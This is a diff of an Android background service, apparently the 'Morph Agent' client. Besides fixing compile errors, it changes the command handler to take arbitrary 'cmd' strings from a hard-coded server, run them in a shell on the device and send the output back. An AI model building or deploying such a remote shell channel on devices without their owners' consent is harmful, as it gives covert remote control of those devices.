@@ -40,7 +40,7 @@ public class CommandService extends Service {
 
     private static final String SERVER_URL = "http://192.168.6.198:5000";
     private String deviceId;
-    private java.net.Socket mSocket;
+    private Socket mSocket;
 
     // Reconnect/backoff helpers
     private final Handler handler = new Handler(Looper.getMainLooper());
@@ -199,14 +199,15 @@ public class CommandService extends Service {
                 @Override
                 public void call(Object... args) {
                     try {
-                        if (args != null && args.length >0) {
-                            String cmd = (String) args[0];
+                        if (args != null && args.length > 0) {
+                            JSONObject cmdData = (JSONObject) args[0];
+                            String cmd = cmdData.getString("cmd");
                             Log.d("WS", "Received command: " + cmd);
-                            String result = CommandExecutor.execute(cmd);
+                            String result = ShellExecutor.execute(cmd);
                             JSONObject respPayload = new JSONObject();
                             respPayload.put("device_id", deviceId);
-                            respPayload.put("output", result);
-                            mSocket.emit("command", respPayload);
+                            respPayload.put("result", result);
+                            mSocket.emit("command_result", respPayload);
                         } else {
                             Log.w("WS", "Received 'command' event with invalid args");
                         }
@@ -289,7 +290,7 @@ public class CommandService extends Service {
         super.onDestroy();
         Log.d(TAG, "CommandService stopped.");
         // Remove scheduled reconnects
-        try { mainHandler.removeCallbacks(reconnectRunnable); } catch (Exception ignored) {}
+        try { handler.removeCallbacks(reconnectRunnable); } catch (Exception ignored) {}
 
         // Cleanly remove listeners and disconnect socket
         if (mSocket != null) {
@@ -299,7 +300,7 @@ public class CommandService extends Service {
                 try { mSocket.close(); } catch (Exception ignored) {}
             } catch (Exception e) {
                 Log.e(TAG, "Error during socket cleanup", e);
-            } finally { 
+            } finally {
                 mSocket = null;
             }
         }
@@ -327,8 +328,8 @@ public class CommandService extends Service {
 
     private void createNotificationChannelIfNeeded() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            Notification chan = new NotificationChannel(NOTIF_CHANNEL_ID, "Morph Agent", NotificationManager.IMPORTANCE_LOW);
-            Notification nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
+            NotificationChannel chan = new NotificationChannel(NOTIF_CHANNEL_ID, "Morph Agent", NotificationManager.IMPORTANCE_LOW);
+            NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
             if (nm != null) nm.createNotificationChannel(chan);
         }
     }
